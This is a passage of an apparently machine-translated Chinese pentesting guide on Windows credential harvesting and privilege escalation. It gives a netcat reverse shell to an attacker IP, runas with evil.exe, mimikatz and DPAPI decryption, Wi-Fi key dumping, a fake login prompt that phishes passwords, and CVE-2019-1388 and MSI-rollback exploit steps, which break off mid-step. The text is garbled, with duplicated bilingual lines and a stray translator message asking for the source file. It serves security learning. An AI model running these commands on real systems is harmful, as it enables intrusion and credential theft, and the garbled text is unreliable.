Windows Vault 存储 Windows 可以自动为用户登录的凭据，这意味着任何 **Windows application that needs credentials to access a resource**（服务器或网站）**can make use of this Credential Manager** 与 Windows Vault，并使用所提供的凭据，而不是让用户每次都输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们无法使用某个资源的凭据。因此，如果你的应用想使用 vault，它应该以某种方式 **communicate with the credential manager and request the credentials for that resource** 从默认存储 vault 获取该资源的凭据。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用 `runas` 和 `/savecred` 选项来使用已保存的凭据。下面的示例通过 SMB 共享调用远程可执行文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用提供的一组凭据运行 `runas`。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
请注意：mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)，或来自 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

The **Data Protection API (DPAPI)** 提供了一种用于数据对称加密的方法，主要在 Windows 操作系统中用于对非对称私钥的对称加密。该加密利用用户或系统的秘密在熵中起到重要作用。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。在涉及系统加密的场景中，它使用系统的域身份验证秘密。

使用 DPAPI 加密的用户 RSA 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 表示用户的 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI key 与保护用户私钥的主密钥共存于同一文件中**，通常由 64 字节的随机数据组成。（需要注意的是，访问此目录受到限制，无法通过 CMD 中的 `dir` 命令列出其内容，但可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz module** `dpapi::masterkey` 并带上适当的参数（`/pvk` 或 `/rpc`）来解密它。

这些 **credentials files protected by the master password** 通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
你可以使用 **mimikatz module** `dpapi::cred` 并使用适当的 `/masterkey` 来解密。\
你可以使用 `sekurlsa::dpapi` 模块从 **内存** 中 **提取** 许多 **DPAPI** **主密钥**（如果你是 root）。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 凭据

**PowerShell 凭据** 通常用于 **脚本** 和自动化任务，作为便捷地存储加密凭据的方式。凭据使用 **DPAPI** 进行保护，这通常意味着它们只能由在创建它们的同一台计算机上的相同用户解密。

要从包含它的文件中**解密** PS 凭据，你可以执行：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP 连接

你可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
以及在 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭据管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
使用 **Mimikatz** `dpapi::rdg` 模块并提供合适的 `/masterkey` 来 **解密任何 .rdg 文件**\

You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module
可以使用 **Mimikatz** 的 `sekurlsa::dpapi` 模块从内存中 **提取许多 DPAPI masterkeys**

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.
许多人在 Windows 工作站上使用 StickyNotes 应用来 **保存密码** 及其他信息，但并不知道它是一个数据库文件。该文件位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，值得查找并进行分析。

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**注意：要从 AppCmd.exe 恢复密码，你需要是 Administrator 并在 High Integrity 权限级别下运行。**\

**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录下。\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.
如果该文件存在，则可能已配置一些 **credentials**，且可以被 **recovered**。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
此代码摘自 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查是否存在 `C:\Windows\CCM\SCClient.exe` .\
安装程序 **以 SYSTEM privileges 运行**，许多易受 **DLL Sideloading（信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表（凭据）

### Putty 凭据
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的 SSH 密钥

SSH 私钥可以存储在注册表键 `HKCU\Software\OpenSSH\Agent\Keys` 中，因此你应该检查里面是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果你在该路径中发现任何条目，它很可能是一个已保存的 SSH key。它以加密形式存储，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) 轻松解密。\
更多关于此技术的信息： [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务未运行，并且你希望它在启动时自动启动，请运行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来此技术不再有效。我尝试创建一些 ssh keys，用 `ssh-add` 添加它们，并通过 ssh 登录到一台机器。注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，procmon 在 asymmetric key authentication 期间也没有识别到 `dpapi.dll` 的使用。

### 无人值守的文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit** 搜索这些文件：_post/windows/gather/enum_unattend_

示例内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### 缓存的 GPP 密码

之前有一个功能允许通过 Group Policy Preferences (GPP) 在一组机器上部署自定义本地管理员帐户。然而，该方法存在严重的安全缺陷。首先，Group Policy Objects (GPOs) 作为 XML 文件存储在 SYSVOL 中，任何域用户都可以访问。其次，这些 GPP 中的密码使用公开记录的默认密钥以 AES256 加密，任何经过身份验证的用户都可以将其解密。这构成严重风险，可能允许用户获得提升的权限。

为减轻该风险，开发了一个函数，用于扫描本地缓存的包含非空 "cpassword" 字段的 GPP 文件。找到此类文件后，函数会解密密码并返回一个自定义的 PowerShell 对象。该对象包含有关 GPP 以及文件位置的详细信息，有助于识别并修复此安全漏洞。

在 `C:\ProgramData\Microsoft\Group Policy\history` 或在 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（在 W Vista 之前）_ 中搜索这些文件：

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**要解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 配置
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
包含凭据的 web.config 示例：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭证
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 请求 credentials

你可以始终**要求用户输入他的 credentials 或甚至其他用户的 credentials**，如果你认为他可能知道它们（注意，**直接询问** 客户以获取 **credentials** 是非常**危险**）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含凭证的文件名**

已知有些文件曾包含以**明文**或**Base64**形式存储的**密码**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
我需要该文件的内容才能进行翻译。请粘贴 src/windows-hardening/windows-local-privilege-escalation/README.md 的完整文本，或授予我访问该文件的内容。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭据

你还应该检查回收站，以查找其中的凭据

要 **恢复密码**（由多个程序保存），可以使用： [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 注册表中

**可能包含凭据的其他注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史记录

你应该检查存储 **Chrome 或 Firefox** 密码的 dbs。\
也要检查浏览器的历史、书签和收藏夹，因为可能有一些 **密码** 存储在那里。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) 是 Windows 操作系统内置的一种技术，允许不同语言的软件组件之间进行相互通信。每个 COM 组件通过 class ID (CLSID) 标识，每个组件通过一个或多个接口暴露功能，接口由 interface IDs (IIDs) 标识。

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (单线程)、**Free** (多线程)、**Both** (单或多线程) 或 **Neutral** (线程中性)。

![](<../../images/image (729).png>)

Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **在文件和注册表中搜索通用密码**

**搜索文件内容**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**按特定文件名搜索文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**搜索注册表中的密钥名称和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索密码的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** 插件，我创建了这个插件用来**自动执行每一个在受害主机上搜索 credentials 的 metasploit POST 模块**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 自动搜索本页中提到的所有包含密码的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个用于从系统提取密码的优秀工具。

该工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 搜索 **sessions**, **usernames** 和 **passwords**，针对那些以明文保存这些数据的工具（PuTTY, WinSCP, FileZilla, SuperPuTTY, 和 RDP）
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

想象一下，**a process running as SYSTEM open a new process** (`OpenProcess()`) 并获得 **full access**。同一进程**also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**。\
然后，如果你对该低权限进程具有 **full access**，你可以获取使用 `OpenProcess()` 打开的特权进程的 **open handle** 并 **inject a shellcode**。\
[阅读此示例以了解有关 **如何检测和利用此漏洞** 的更多信息。](leaked-handle-exploitation.md)\
[另请阅读这篇**文章，以更完整地解释如何测试并滥用继承了不同权限级别（不仅限于 full access）的进程和线程的更多打开句柄**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共享内存段，称为 **pipes**，用于进程间通信和数据传输。

Windows 提供了名为 **Named Pipes** 的功能，允许不相关的进程共享数据，甚至跨网络。它类似于客户端/服务器架构，其角色定义为 **named pipe server** 和 **named pipe client**。

当数据由 **client** 通过 pipe 发送时，设置该 pipe 的 **server** 在拥有必要的 **SeImpersonate** 权限时可以**承担（冒充）该 client 的身份**。识别出通过你可以模拟的 pipe 进行通信的**特权进程**，一旦该进程与您建立的 pipe 交互，就可以通过采用其身份来**获得更高的权限**。关于执行此类攻击的说明，可参考[**这里**](named-pipe-client-impersonation.md)和[**这里**](#from-high-integrity-to-system)。

此外，下面的工具允许你**用类似 burp 的工具拦截 named pipe 通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **而另一个工具允许列出并查看所有 pipes 以发现 privescs：** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## 其他

### File Extensions that could execute stuff in Windows

查看页面 **https://filesec.io/**

### **监控命令行中的密码**

当以用户身份获得 shell 时，可能有计划任务或其他正在执行的进程会**在命令行中传递凭据**。下面的脚本每两秒捕获进程的命令行，并将当前状态与上一次状态进行比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面（通过控制台或 RDP）并且启用了 UAC，在某些版本的 Microsoft Windows 中，有可能让非特权用户运行一个终端或任何其他进程，例如以 "NT\AUTHORITY SYSTEM" 身份运行。

这就可以利用同一个漏洞同时提升权限并绕过 UAC。此外，无需安装任何东西，过程中使用的可执行文件是由 Microsoft 签名并发行的。

受影响的一些系统如下：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

阅读此文以**了解完整性级别（Integrity Levels）**：


{{#ref}}
integrity-levels.md
{{#endref}}

然后**阅读此文以了解 UAC 及 UAC 绕过：**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

该技术在 [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) 中描述，并且存在利用代码 [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。

该攻击基本上是滥用 Windows Installer 的 rollback 功能，在卸载过程中将合法文件替换为恶意文件。为此，攻击者需要创建一个**恶意 MSI 安装包**，用于劫持 `C:\Config.Msi` 文件夹，之后 Windows Installer 在卸载其他 MSI 包时会将 rollback 文件存放到该目录，而这些 rollback 文件会被修改为包含恶意负载。

该技术摘要如下：

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
  - 创建一个 `.msi`，在可写文件夹（`TARGETDIR`）中安装一个无害文件（例如 `dummy.txt`）。
  - 将安装程序标记为 **"UAC Compliant"**，以便**非管理员用户**可以运行它。
  - 在安装后保持对该文件的一个 **handle** 打开。

- Step 2: Begin Uninstall
  - 卸载相同的 `.msi`。
  - 卸载过程开始将文件移动到 `C:\Config.Msi` 并将它们重命名为 `.rbf` 文件（rollback 备份）。
  - 使用 `GetFinalPathNameByHandle` **轮询打开的文件句柄**，以检测文件何时变为 `C:\Config.Msi\<random>.rbf`。

- Step 3: Custom Syncing
  - 该 `.msi` 包含一个**自定义卸载动作（SyncOnRbfWritten）**，该动作：
    - 在 `.rbf` 写入时发出信号。
    - 然后在继续卸载之前**等待**另一个事件。

- Step 4: Block Deletion of `.rbf`
  - 当接收到信号时，**以不含 `FILE_SHARE_DELETE` 的方式打开 `.rbf` 文件**——这将**阻止其被删除**。
  - 然后**回传信号**以便卸载可以完成。
  - Windows Installer 无法删除该 `.rbf`，因为无法删除所有内容，**`C:\Config.Msi` 不会被移除**。

- Step 5: Manually Delete `.rbf`
  - 你（攻击者）手动删除 `.rbf` 文件。
  - 现在 **`C:\Config.Msi` 为空**，可以被劫持。

> 在此时，**触发 SYSTEM 级别的任意文件夹删除漏洞**以删除 `C:\Config.Msi`。

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
  - 重新创建 `C:\Config.Msi` 文件夹。
  - 设置**弱 DACL**（例如 Everyone:F），并保持一个带有 `WRITE_DAC` 的句柄打开。

- Step 7: Run Another Install
  - 再次安装该 `.msi`，并设置：
    - `TARGETDIR`：可写位置。
    - `ERROROUT`：一个触发强制失败的变量。
  - 此次安装将用于再次触发 **rollback**，它会读取 `.rbs` 和 `.rbf`。

- Step 8: Monitor for `.rbs`
  - 使用 `ReadDirectoryChangesW` 监控 `C:\Config.Msi`，直到出现新的 `.rbs`。
  - 捕获其文件名。

- Step 9: Sync Before Rollback
  - 该 `.msi` 包含一个**自定义安装动作（SyncBeforeRollback）**，该动作：
    - 当 `.rbs` 被创建时发出事件信号。
    - 然后在继续之前**等待**。

- Step 10: Reapply Weak ACL
  - 在收到 `.rbs created` 事件后：
    - Windows Installer **会重新应用强 ACL** 到 `C:\Config.Msi`。
    - 但由于你仍然持有带有 `WRITE_DAC` 的句柄，你可以**再次重新应用弱 ACL**。

> ACL 仅在打开句柄时强制执行，因此你仍然可以写入该文件夹。

- Step 11: Drop Fake `.rbs` and `.rbf`
  - 覆盖 `.rbs` 文件为一个**伪造的 rollback 脚本**，指示 Windows：
    - 将你的 `.rbf`（恶意 DLL）恢复到一个**受保护的位置**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
    - 放置你的伪造 `.rbf`，其中包含**SYSTEM 级别的恶意负载 DLL**。

- Step 12: Trigger the Rollback
  - 发出同步事件使安装程序继续。
  - 一个**type 19 custom action（ErrorOut）** 被配置为在已知点**故意使安装失败**。
  - 这会导致**开始 rollback**。

- Step 13: SYSTEM Installs Your DLL
  - Windows Installer：
    - 读取你恶意的 `.rbs`。
